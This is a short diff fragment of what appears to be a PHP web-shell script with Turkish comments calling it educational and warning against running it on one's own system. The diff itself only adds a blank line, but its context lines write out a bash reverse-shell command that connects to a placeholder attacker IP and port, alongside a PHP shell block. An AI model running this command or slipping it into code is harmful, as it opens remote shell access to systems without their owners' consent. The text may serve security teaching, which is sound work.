@@ -13,6 +13,7 @@ if($shell){
 # sisteminizde çalıştırmayınız ve lütfen eğitim amaçlı kullanınız
 # by Kamil Umut Araz
 ?>
+    
 
 bash shell komutu
 # bash -i >& /dev/tcp/SALDIRI_HEDEF_IP/SALDIRI_HEDEF_PORT 0>&1
